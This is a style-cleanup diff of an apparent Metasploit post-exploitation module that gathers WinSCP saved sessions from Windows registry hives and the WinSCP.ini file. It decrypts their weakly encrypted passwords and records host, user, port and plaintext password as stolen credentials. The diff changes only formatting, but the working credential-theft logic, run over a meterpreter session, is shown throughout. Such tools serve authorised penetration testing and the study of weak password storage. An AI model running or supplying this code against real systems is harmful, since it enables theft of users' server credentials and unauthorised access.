@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -16,33 +17,32 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Rex::Parser::WinSCP
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
-      'Description'   => %q{
-        This module extracts weakly encrypted saved passwords from
-        WinSCP. It searches for saved sessions in the Windows Registry
-        and the WinSCP.ini file. It cannot decrypt passwords if a master
-        password is used.
-        },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'theLightCosine'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+                      'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
+                      'Description'   => %q(
+                        This module extracts weakly encrypted saved passwords from
+                        WinSCP. It searches for saved sessions in the Windows Registry
+                        and the WinSCP.ini file. It cannot decrypt passwords if a master
+                        password is used.
+                        ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'theLightCosine'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
   end
 
   def get_reg
     # Enumerate all the SID in HKEY_Users and see if any of them have WinSCP RegistryKeys.
     regexists = 0
 
-    userhives=load_missing_hives()
+    userhives = load_missing_hives
     userhives.each do |hive|
-      next if hive['HKU'] == nil
+      next if hive['HKU'].nil?
       master_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"
       masterpw = registry_getvaldata(master_key, 'UseMasterPassword')
 
-      #No WinSCP Keys here
+      # No WinSCP Keys here
       next if masterpw.nil?
 
       regexists = 1
@@ -64,11 +64,11 @@ class MetasploitModule < Msf::Post
           active_session = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{saved_session}"
           password = registry_getvaldata(active_session, 'Password')
           # There is no password saved for this session, so we skip it
-          next if password == nil
+          next if password.nil?
 
           savedpwds = 1
           portnum = registry_getvaldata(active_session, 'PortNumber')
-          if portnum == nil
+          if portnum.nil?
             # If no explicit port number entry exists, it is set to default port of tcp22
             portnum = 22
           end
@@ -81,13 +81,11 @@ class MetasploitModule < Msf::Post
 
           plaintext = decrypt_password(encrypted_password, "#{user}#{host}")
 
-          winscp_store_config({
-            hostname: host,
-            username: user,
-            password: plaintext,
-            portnumber: portnum,
-            protocol: sname
-          })
+          winscp_store_config(hostname: host,
+                              username: user,
+                              password: plaintext,
+                              portnumber: portnum,
+                              protocol: sname)
         end
 
         if savedpwds == 0
@@ -96,22 +94,19 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    if regexists == 0
-      print_status("No WinSCP Registry Keys found!")
-    end
+    print_status("No WinSCP Registry Keys found!") if regexists == 0
     unload_our_hives(userhives)
-
   end
 
   def run
     print_status("Looking for WinSCP.ini file storage...")
 
     # WinSCP is only x86...
-    if sysinfo['Architecture'] == 'x86'
-      prog_files_env = 'ProgramFiles'
-    else
-      prog_files_env = 'ProgramFiles(x86)'
-    end
+    prog_files_env = if sysinfo['Architecture'] == 'x86'
+                       'ProgramFiles'
+                     else
+                       'ProgramFiles(x86)'
+                     end
     env = get_envs('APPDATA', prog_files_env, 'USERNAME')
 
     if env['APPDATA'].nil?
@@ -168,13 +163,13 @@ class MetasploitModule < Msf::Post
       port: config[:portnumber],
       service_name: config[:protocol],
       protocol: 'tcp',
-      workspace_id: myworkspace_id,
+      workspace_id: myworkspace_id
     }
 
     credential_data = {
       origin_type: :session,
       session_id: session_db_id,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       private_type: :password,
       private_data: config[:password],
       username: config[:username]
@@ -189,5 +184,4 @@ class MetasploitModule < Msf::Post
 
     create_credential_login(login_data)
   end
-
 end
